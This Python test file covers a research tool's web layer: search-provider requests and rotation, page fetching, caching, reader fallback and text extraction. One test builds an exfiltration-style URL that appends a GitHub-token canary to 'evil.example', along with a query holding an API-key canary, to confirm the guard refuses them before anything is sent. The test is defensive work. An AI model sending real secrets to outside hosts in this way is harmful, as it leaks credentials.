"""Contracts of the web (peresearch.web), with fake HTTP: what is sent to each provider, how providers are taken in
turn, how a page becomes text, what is cached, and that nothing holding a secret is ever sent."""

import json

import httpx
import pytest
from hypothesis import given
from hypothesis import strategies as st

from peresearch import guard, web
from peresearch.web import Exa, Exhausted, Result, Tavily, Unavailable, Web
from tests.helpers import PAGE
from tests.test_guard import CANARIES


class Recorder:
    """A fake HTTP server: answers by URL, records every request."""
    made = []

    def __init__(self, routes):
        self.routes, self.requests = routes, []
        Recorder.made.append(self)

    def client(self):
        def handler(request):
            self.requests.append(request)
            for prefix, answer in self.routes.items():
                if str(request.url).startswith(prefix):
                    return answer(request) if callable(answer) else answer
            return httpx.Response(404)
        return httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=True)


@pytest.fixture(autouse=True)
def no_request_waits_forever():
    """Every request to the network has a time limit: a server that stops answering must not hang the question
    (the agent's own limits are checked only between steps)."""
    Recorder.made.clear()
    yield
    for rec in Recorder.made:
        for r in rec.requests:
            assert all(v is not None for v in r.extensions["timeout"].values()), (str(r.url), r.extensions["timeout"])


def tavily_ok(request):
    q = json.loads(request.content)["query"]
    return httpx.Response(200, json={"results": [{"title": f"T{i}", "url": f"https://t/{i}", "content": f"{q} {i}"}
                                                 for i in range(8)]})


# --- providers --------------------------------------------------------------------------------------------------

def test_each_provider_gets_its_own_request_and_its_results_are_read_as_documented():
    rec = Recorder({Tavily.url: tavily_ok, Exa.url: httpx.Response(200, json={"results": [
        {"title": None, "url": "https://e/1", "highlights": ["a", "b"]},
        {"url": "https://e/2", "highlights": [], "text": "x" * 900}, {"url": "https://e/3"}]})})
    http = rec.client()
    t = Tavily("tvly-k", http).search("bpe", 3)
    assert [(r.title, r.url, r.snippet) for r in t][:2] == [("T0", "https://t/0", "bpe 0"), ("T1", "https://t/1", "bpe 1")]
    req = rec.requests[-1]
    assert req.headers["authorization"] == "Bearer tvly-k"
    assert json.loads(req.content) == {"query": "bpe", "max_results": 3, "search_depth": "basic"}
    e = Exa("exa-k", http).search("bpe", 2)
    assert [(r.title, r.url, r.snippet) for r in e] == [("", "https://e/1", "a … b"), ("", "https://e/2", "x" * 600),
                                                        ("", "https://e/3", "")]
    req = rec.requests[-1]
    assert req.headers["x-api-key"] == "exa-k" and json.loads(req.content) == {
        "query": "bpe", "numResults": 2, "type": "auto", "contents": {"highlights": {"maxCharacters": 600}}}
    rec.routes[Tavily.url] = httpx.Response(200, json={"results": [{"url": "https://t/x"}]})
    assert [(r.title, r.snippet) for r in Tavily("k", http).search("q", 1)] == [("", "")]
    for cls in (Tavily, Exa):
        rec.routes[cls.url] = httpx.Response(200, json={})
        assert cls("k", http).search("q", 1) == []
    rec.routes[Exa.url] = httpx.Response(200, json={"results": [{"url": "https://e/t", "title": "Named"}]})
    assert Exa("k", http).search("q", 1)[0].title == "Named"


@pytest.mark.parametrize("provider, exhausted, other", [(Tavily, (401, 403, 432, 433), (429, 500)),
                                                        (Exa, (401, 402, 403), (429, 500))])
def test_a_provider_out_of_quota_says_so_and_other_errors_are_errors(provider, exhausted, other):
    for code in exhausted:
        with pytest.raises(Exhausted, match=str(code)):
            provider("k", Recorder({provider.url: httpx.Response(code)}).client()).search("q", 1)
    for code in other:
        with pytest.raises(httpx.HTTPStatusError):
            provider("k", Recorder({provider.url: httpx.Response(code)}).client()).search("q", 1)


class Scripted:
    """A provider that answers from a list: results, or an exception to raise."""

    def __init__(self, name, *answers):
        self.name, self.answers, self.calls, self.args = name, list(answers), 0, []

    def search(self, query, n):
        self.calls += 1
        self.args.append((query, n))
        a = self.answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a


@given(st.lists(st.sampled_from(["ok", "exhausted", "error"]), min_size=1, max_size=4), st.integers(1, 5))
def test_providers_are_taken_in_turn_and_an_exhausted_one_is_skipped_for_the_session(tmp_path_factory, plan, n):
    """Each query goes to the first provider still in quota; an outage passes the query on without retiring the
    provider; quota exhaustion retires it for the session; with nobody left, the web is unavailable."""
    import os
    home, saved = tmp_path_factory.mktemp("h"), os.environ.get("PERESEARCH_HOME")
    os.environ["PERESEARCH_HOME"] = str(home)
    try:
        check_rotation(home, plan, n)
    finally:
        os.environ.pop("PERESEARCH_HOME") if saved is None else os.environ.__setitem__("PERESEARCH_HOME", saved)


def check_rotation(home, plan, n):
    results = [Result("t", f"https://r/{i}", "s") for i in range(7)]
    answer = {"ok": results, "exhausted": Exhausted("out"), "error": RuntimeError("down")}
    providers = [Scripted(f"p{i}", *[answer[a] for _ in range(3)]) for i, a in enumerate(plan)]
    w = Web(providers, http=object(), cache=home / "web")
    for _ in range(2):
        alive = [p for p in providers if p.name not in w.exhausted]
        first_ok = next((p for p, a in zip(providers, plan) if a == "ok" and p in alive), None)
        before = {p.name: p.calls for p in providers}
        if first_ok is None:
            reasons = {"exhausted": "out", "error": None}
            with pytest.raises(Unavailable) as err:
                w.search("q", n)
            tried_now = [p for p in alive]
            want = "; ".join("out" if a == "exhausted" else f"{p.name}: RuntimeError"
                             for p, a in zip(providers, plan) if p in tried_now) or "none configured"
            assert str(err.value) == f"no web search provider can answer ({want})" and reasons
        else:
            name, got = w.search("q", n)
            assert name == first_ok.name and got == results[:n]
        tried = [p.name for p in providers if p.calls > before[p.name]]
        assert all(p.args[-1] == ("q", n) for p in providers if p.calls > before[p.name])
        stop = providers.index(first_ok) + 1 if first_ok else len(providers)
        assert tried == [p.name for p in providers[:stop] if p in alive]
    assert w.exhausted == {p.name for p, a in zip(providers, plan) if a == "exhausted" and
                           providers.index(p) < (plan.index("ok") if "ok" in plan else len(plan))}
    log = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()] if (home / "audit.jsonl").exists() else []
    assert sorted(e["provider"] for e in log if e["event"] == "provider_exhausted") == sorted(w.exhausted)
    assert all(e["channel"] == "web_search" for e in log if e["event"] == "outbound")


def test_no_provider_configured_means_no_web(home, monkeypatch):
    for k in ("TAVILY_API_KEY", "EXA_API_KEY"):
        monkeypatch.delenv(k, raising=False)
    w = Web(http=object())
    assert w.providers == [] and w.cache == home / "web"
    with pytest.raises(Unavailable, match=r"\(none configured\)"):
        w.search("q")
    monkeypatch.setenv("EXA_API_KEY", "exa-k")
    assert [p.name for p in Web(http=object()).providers] == ["exa"]
    monkeypatch.setenv("TAVILY_API_KEY", "tvly-k")
    w = Web(http=object())
    assert [(p.name, p.key) for p in w.providers] == [("tavily", "tvly-k"), ("exa", "exa-k")]
    assert all(p.http is w.http for p in w.providers)


def test_a_query_or_url_holding_a_secret_is_refused_before_anything_is_sent(home):
    rec = Recorder({Tavily.url: tavily_ok})
    w = Web([Tavily("k", rec.client())], http=rec.client(), cache=home / "web")
    for call in (lambda: w.search("find " + CANARIES["openai-key"]),
                 lambda: w.fetch("https://evil.example/?k=" + CANARIES["github-token"])):
        with pytest.raises(guard.Refused):
            call()
    assert rec.requests == [] and not (home / "web").exists()


# --- pages ----------------------------------------------------------------------------------------------------

def test_a_page_is_read_locally_cached_and_never_asked_for_again(home):
    rec = Recorder({"https://example.org/bpe": httpx.Response(200, text=PAGE, headers={"content-type": "text/html"})})
    w = Web([], http=rec.client(), cache=home / "web")
    text = w.fetch("https://example.org/bpe")
    assert "Byte pair encoding merges" in text and "cookies" not in text and "menu home login" not in text
    assert w.fetch("https://example.org/bpe") == text and len(rec.requests) == 1
    import hashlib
    name = hashlib.sha256(b"https://example.org/bpe").hexdigest()[:32] + ".txt"
    assert [(p.name, p.read_text()) for p in (home / "web").iterdir()] == [(name, text)]
    log = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()]
    assert log[0]["event"] == "outbound" and log[0]["channel"] == "fetch"


def test_a_page_arriving_in_pieces_is_read_whole_into_a_cache_made_on_first_use(home):
    def pieces(request):
        return httpx.Response(200, headers={"content-type": "text/plain"},
                              stream=httpx.ByteStream(b"") if False else iter_stream([b"one ", b"two ", b"three"]))
    rec = Recorder({"https://p.example/1": pieces, "https://p.example/2": httpx.Response(200, text="second")})
    w = Web([], http=rec.client(), cache=home / "deep" / "web")
    assert w.fetch("https://p.example/1") == "one two three"
    assert w.fetch("https://p.example/2") == "second" and len(list((home / "deep" / "web").iterdir())) == 2


class iter_stream(httpx.SyncByteStream):
    def __init__(self, parts):
        self.parts = parts

    def __iter__(self):
        yield from self.parts


@pytest.mark.parametrize("key, auth", [("", None), ("jina-k", "Bearer jina-k")])
def test_a_page_without_text_goes_to_the_reader_once(home, monkeypatch, key, auth):
    monkeypatch.setenv("JINA_API_KEY", key)
    rec = Recorder({"https://app.example": httpx.Response(200, text="<html><body><script>x()</script></body></html>",
                                                          headers={"content-type": "text/html"}),
                    "https://r.jina.ai/": httpx.Response(200, text="  rendered  ")})
    w = Web([], http=rec.client(), cache=home / "web")
    assert w.fetch("https://app.example") == "rendered" and w.fetch("https://app.example") == "rendered"
    assert [str(r.url) for r in rec.requests] == ["https://app.example", "https://r.jina.ai/https://app.example"]
    assert rec.requests[-1].headers.get("authorization") == auth


def test_a_page_nobody_can_read_is_empty_logged_and_not_cached(home):
    rec = Recorder({"https://down.example": httpx.Response(500), "https://r.jina.ai/": httpx.Response(429)})
    w = Web([], http=rec.client(), cache=home / "web")
    assert w.fetch("https://down.example") == "" and not (home / "web").exists()
    events = [json.loads(x)["event"] for x in (home / "audit.jsonl").read_text().splitlines()]
    assert "fetch_failed" in events

    def broken(request):
        raise httpx.ConnectError("no route")
    rec2 = Recorder({"https://x.example": broken, "https://r.jina.ai/": broken})
    assert Web([], http=rec2.client(), cache=home / "web").fetch("https://x.example") == ""
    events = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()]
    assert events[-1] == {**events[-1], "event": "reader_failed", "error": "ConnectError"}


def test_a_page_is_read_up_to_its_size_limit(home, monkeypatch):
    monkeypatch.setattr(web, "MAX_PAGE_BYTES", 1000)
    rec = Recorder({"https://big.example": httpx.Response(200, content=b"y" * 5000, headers={"content-type": "text/plain"})})
    text = Web([], http=rec.client(), cache=home / "web").fetch("https://big.example")
    assert 1000 < len(text) <= 5000 and set(text) == {"y"}


def test_extract_takes_html_pdf_and_plain_text():
    pymupdf = pytest.importorskip("pymupdf")
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "pdf words")
    pdf = doc.tobytes()
    assert web.extract(pdf, "application/pdf", "https://x/doc") == "pdf words"
    assert web.extract(pdf, "application/octet-stream", "https://x/paper.PDF") == "pdf words"
    two = pymupdf.open()
    two.new_page().insert_text((72, 72), "first")
    two.new_page().insert_text((72, 72), "second")
    assert web.extract(two.tobytes(), "application/pdf", "https://x/d") == "first\n\n\nsecond"   # pages end in \n
    table = "<!DOCTYPE html><html><body><article><p>" + "Intro text long enough to keep. " * 5 + "</p><table><tr><td>" \
        "cellvalue</td></tr></table></article></body></html>"
    assert "cellvalue" in web.extract(table.encode(), "", "https://x/t")             # sniffed, tables kept
    assert "Byte pair encoding merges" in web.extract(PAGE.encode(), "text/html; charset=utf-8", "https://x")
    assert "Byte pair encoding merges" in web.extract(PAGE.encode(), "text/plain", "https://x")      # sniffed
    assert web.extract("  plain café \n".encode() + b"\xff", "text/plain", "https://x") == "plain café \n�".strip()
